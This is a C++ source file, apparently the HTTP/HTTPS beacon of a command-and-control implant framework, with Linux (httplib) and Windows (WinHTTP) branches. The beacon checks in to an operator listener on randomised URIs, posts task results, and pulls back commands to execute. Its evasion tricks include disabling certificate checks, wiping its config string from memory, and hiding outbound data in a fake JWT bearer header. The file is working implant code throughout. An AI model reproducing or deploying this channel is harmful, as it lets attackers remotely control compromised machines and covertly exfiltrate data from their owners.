#include "BeaconHttp.hpp"

#include <random>

#ifdef __linux__

#define CPPHTTPLIB_OPENSSL_SUPPORT
#include "httplib.h"

#elif _WIN32

#include <WinHttp.h>
#pragma comment(lib, "winhttp.lib")

#endif


using namespace std;


#ifdef __linux__

using namespace httplib;

#elif _WIN32

std::wstring getUtf16(const std::string& str, int codepage)
{
    if (str.empty()) 
        return std::wstring();
    int sz = MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), 0, 0);
    std::wstring res(sz, 0);
    MultiByteToWideChar(codepage, 0, &str[0], (int)str.size(), &res[0], sz);
    return res;
}


string HttpsWebRequestPost(const string& domain, int port, const string& url, const string& data, const nlohmann::json& httpHeaders, bool isHttps)
{
    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, sdomain.c_str(), port, 0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);

    // Add a request header.
    if( hRequest )
    {
        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=(it).value();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    if(isHttps)
    {
        // if https & self sign certificat
        dwFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // // Debug proxy configuration
    // // https://stackoverflow.com/questions/35082021/code-to-send-an-http-request-through-a-proxy-using-winhttp
    // // https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsendrequest
    // WINHTTP_PROXY_INFO proxy = { 0 };
    // proxy.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    // proxy.lpszProxy = L"http://127.0.0.1:8080";
    // WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxy, sizeof(proxy));

    // Post data
    LPSTR pdata = const_cast<char*>(data.c_str());;
    DWORD lenData = data.size();

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)pdata, lenData, lenData, 0);

    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);


    // Keep checking for data until there is nothing left.
    string response;
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
                    // printf("%s", pszOutBuffer);
                    response = response + string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect) 
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);

    return response;
}


// send data in a fake jwt
string HttpsWebRequestGet(const string& domain, int port, const string& url, const string& data, const nlohmann::json& httpHeaders, bool isHttps)
{
    wstring sdomain = getUtf16(domain, CP_UTF8);
    wstring surl = getUtf16(url, CP_UTF8);

    DWORD dwSize = 0;
    
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL, hConnect = NULL, hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, sdomain.c_str(), port, 0);

    // Create an HTTP request handle.
    DWORD dwFlags = 0;
    if(isHttps)
        dwFlags = WINHTTP_FLAG_REFRESH | WINHTTP_FLAG_SECURE;

    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", surl.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, dwFlags);

    // Add a request header.
    if( hRequest )
    {
        for (auto& it : httpHeaders.items())
        {
            std::string newHeader = (it).key();
            newHeader+=":";
            newHeader+=(it).value();

            std::wstring stemp = std::wstring(newHeader.begin(), newHeader.end());

            bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );
        }
    }

    std::string dataHeader = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkb21haW4iOiJkZWNhdW1pYWJhaWxsZW54LmNvbSIsImlkIjoiMTUxNjIzOTAyMiIsInVzZXIiOiJnZXN0In0.";
    dataHeader+=data;
    std::wstring stemp = std::wstring(dataHeader.begin(), dataHeader.end());
    bResults = WinHttpAddRequestHeaders( hRequest, stemp.c_str(), (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );

    if(isHttps)
    {
        // if https & self sign certificat
        dwFlags =
            SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
    }

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwStatusCode = 0;
    dwSize = sizeof(dwStatusCode);

    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);


    // Keep checking for data until there is nothing left.
    string response;
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
            {
                // printf("Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
            }

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                // printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                DWORD dwDownloaded = 0;
                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
                {
                    // printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else
                {
                    // printf("%s", pszOutBuffer);
                    response = response + string(pszOutBuffer);
                }

                // Free the memory allocated to the buffer.
                delete[] pszOutBuffer;
            }
        } while (dwSize > 0);
    }

    // Report any errors.
    // if (!bResults)
    //     printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) 
        WinHttpCloseHandle(hRequest);
    if (hConnect) 
        WinHttpCloseHandle(hConnect);
    if (hSession) 
        WinHttpCloseHandle(hSession);

    return response;
}


#endif


BeaconHttp::BeaconHttp(std::string& config, std::string& ip, int port, bool isHttps)
    : Beacon()
    , m_isHttps(isHttps)
{
    srand(time(NULL));

    m_ip = ip;
    m_port = port;

    // Http communcation config
    nlohmann::json configJson = nlohmann::json::parse(config);
    if(isHttps)
        m_beaconHttpConfig = configJson["ListenerHttpsConfig"];
    else
        m_beaconHttpConfig = configJson["ListenerHttpConfig"];

    // beacon and modules config
    initConfig(config);
    
    for(int i=0; i<config.size(); i++)
        config[i]='.';
}


BeaconHttp::~BeaconHttp()
{
}


void BeaconHttp::checkIn()
{
    
#ifdef __linux__

    if(m_isHttps)
    {
        httplib::SSLClient cli(m_ip, m_port);
        cli.enable_server_certificate_verification(false);

        std::string output;
        taskResultsToCmd(output);

        nlohmann::json httpsUri = m_beaconHttpConfig["uri"];
        std::string endPoint = httpsUri[ rand() % httpsUri.size() ];

        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];

        httplib::Headers httpClientHeaders;
        for (auto& it : httpHeaders.items())
            httpClientHeaders.insert({(it).key(), (it).value()});

        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
        {
            if (res->status == 200) 
            {
                std::string input = res->body;
                if(!input.empty())
                {
                    cmdToTasks(input);
                }
            }
        }
    }
    else
    {
        httplib::Client cli(m_ip, m_port);

        std::string output;
        taskResultsToCmd(output);

        nlohmann::json httpUri = m_beaconHttpConfig["uri"];
        std::string endPoint = httpUri[ rand() % httpUri.size() ];

        nlohmann::json httpHeaders = m_beaconHttpConfig["client"]["headers"];

        httplib::Headers httpClientHeaders;
        for (auto& it : httpHeaders.items())
            httpClientHeaders.insert({(it).key(), (it).value()});

        if (auto res = cli.Post(endPoint, httpClientHeaders, output, "text/plain;charset=UTF-8"))
        {
            if (res->status == 200) 
            {
                std::string input = res->body;
                if(!input.empty())
                {
                    cmdToTasks(input);
                }
            }
        }
    }


#elif _WIN32

    std::string endPoint;

    if(m_isHttps)
    {
        auto httpsUri = m_beaconHttpConfig["uri"];
        endPoint = httpsUri[ rand() % httpsUri.size() ];
    }
    else
    {
        auto httpUri = m_beaconHttpConfig["uri"];
        endPoint = httpUri[ rand() % httpUri.size() ];
    }

    std::string output;
    taskResultsToCmd(output);

    nlohmann::json httpHeaders;
    if(!m_isHttps)
        httpHeaders = m_beaconHttpConfig["client"]["headers"];
    else 
        httpHeaders = m_beaconHttpConfig["client"]["headers"];

    // TODO put a rule to know when do post and when we do get
    bool isPost=true;

    std::string input;
    if(isPost)
        input = HttpsWebRequestPost(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps);
    else
        input = HttpsWebRequestGet(m_ip, m_port, endPoint, output, httpHeaders, m_isHttps);

    if (!input.empty())
    {
        cmdToTasks(input);
    }

#endif


}
